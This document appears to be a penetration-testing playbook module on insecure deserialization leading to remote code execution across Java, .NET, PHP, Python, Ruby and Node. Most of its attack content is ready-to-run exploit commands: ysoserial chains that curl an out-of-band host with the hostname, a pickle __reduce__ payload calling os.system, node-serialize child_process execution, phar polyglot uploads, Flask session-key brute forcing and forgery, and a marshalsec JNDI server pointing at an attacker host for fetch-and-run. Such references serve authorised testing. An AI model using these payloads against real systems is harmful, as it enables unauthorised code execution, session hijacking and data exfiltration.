# Moraa — Insecure deserialization (→ RCE)

> Load when the app deserializes attacker-controlled bytes: serialized cookies/tokens, `viewstate`,
> cache/session blobs, message-queue payloads, import/upload of object files, RMI/JMX. RCE-class.
> (Our source-audit lens: unsafe `Marshal`/`pickle`/`ObjectInputStream`/`yaml.load`/`Oj` sinks.)

## Fingerprint the format
```
Java:    base64 starting rO0AB (hex ac ed 00 05) ; content-type application/x-java-serialized-object
Python:  pickle — base64 starting gAS / gASV / (dp0 / \x80 ; often in cookies/cache
PHP:     serialize() — O:8:"stdClass":... a:2:{...}  ; __wakeup/__destruct gadgets
.NET:    ViewState (__VIEWSTATE), BinaryFormatter/LosFormatter/Json.NET $type ; base64 AAEAAAD
Ruby:    Marshal.load — base64 starting BAh ; Oj object-mode / YAML.load Psych
Node:    node-serialize {"rce":"_$$ND_FUNC$$_function(){...}()"} ; funcster ; serialize-javascript
YAML:    !!python/object, !ruby/object, !!javax..., SnakeYAML !!com... constructors
```

## Detect
```
- flip a byte in the blob → 500 with a deserialization stack trace = it's being deserialized.
- change a type/length prefix → different error → controllable.
- blind: inject a gadget that does a DNS/HTTP callback (URLDNS for Java) to confirm without RCE.
```

## Exploit
```bash
# Java — ysoserial (pick chain by libs on classpath: CommonsCollections1-7, Spring, Groovy, etc.)
java -jar ysoserial.jar CommonsCollections6 'curl http://OAST/$(hostname)' | base64 -w0
# blind confirm without RCE:
java -jar ysoserial.jar URLDNS 'http://<token>.oast.fun' | base64 -w0     # DNS hit = vulnerable
# .NET
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "cmd /c calc" ; ViewState via ysoserial.net (needs keys)
# PHP: craft POP chain from app classes with __wakeup/__destruct/__toString (phpggc for known libs)
phpggc Laravel/RCE1 system id -b
# Python pickle:
python3 -c 'import pickle,os,base64;print(base64.b64encode(pickle.dumps(type("x",(),{"__reduce__":lambda s:(os.system,("id",))})())).decode())'
# Node node-serialize: {"x":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\")}()"}
```

## Where to inject
Cookies/session, `__VIEWSTATE`, JWT with a serialized claim, cache keys, file-import (`.ser`/`.pickle`
/model files), message queues (SQS/Rabbit/Kafka consumers), XML (→ also XXE), `Content-Type` that
selects a deserializer (XML vs JSON via `$type`/`@class`).

## Bypass / alternate trigger techniques
```
PHP __wakeup property-count bypass (CVE-2016-7124, PHP <5.6.25/<7.0.10):
  declare MORE properties in the serialized string than the class actually has —
  O:4:"User":3:{...} when only 2 exist → __wakeup() is SKIPPED but the object still builds,
  so a __destruct/__toString gadget still fires. Defeats apps that use __wakeup to re-validate input.

phar:// trigger with NO direct unserialize() call:
  ANY file-op on an attacker-controlled path deserializes a Phar's metadata —
  file_exists() / is_dir() / getimagesize() / md5_file() / copy() are all sinks.
  Upload an image-polyglot phar (GIF89a magic + phar stub + POP-gadget metadata), then trigger via
  file_exists("phar://uploads/evil.jpg"). PHP 8.0+ needs an explicit Phar::getMetadata() call — still
  live on the PHP 7.x install base. See file-upload.md for the polyglot upload primitive.

Flask/Django signed-cookie HMAC forgery (no gadget needed if you have the key):
  Flask sessions are signed, NOT encrypted. Recover/guess SECRET_KEY (debug endpoint, leaked config,
  GitHub, weak default) then:
    flask-unsign --sign --cookie '{"user":"admin"}' --secret 'LEAKED_KEY'    # forge any session
    flask-unsign --unsign --cookie '<captured>' --wordlist rockyou.txt      # brute a weak key
  A Flask filesystem-session cookie starting gASV is pickle underneath — forge a session containing
  a __reduce__ gadget object for RCE, not just claim tampering. Django PickleSerializer sessions = same primitive.

Java JNDI gadget (no CommonsCollections on classpath, but Jackson/JNDI lookup reachable):
  java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker:8000/#Exploit" 1389
  # point the app's JNDI-lookup gadget at ldap://attacker:1389/Exploit — Log4Shell-style fetch-and-run

XMLDecoder / Jackson polymorphic JSON RCE — NO ac ed 00 05 magic bytes on the wire:
  <java><object class="java.lang.Runtime" method="exec">...</object></java>  (XMLDecoder direct method calls)
  Jackson enableDefaultTyping + {"@class":"..."} polymorphic deserialization
  Our wire-signature table above is Java-STREAM-only — these two produce readable XML/JSON, not
  base64 rO0AB, so they won't show up in a byte-signature grep. Check for XMLDecoder/@class usage
  directly in source/decompiled jars when the stream-signature scan comes back clean.
```

## Method
Identify format → confirm deserialization (byte flip / URLDNS blind) → build the right gadget chain
for the app's libs → minimal proof (OAST/`id`). → `validate.md` → `findings/`. Don't run destructive
gadgets on prod; a DNS callback proves it safely.
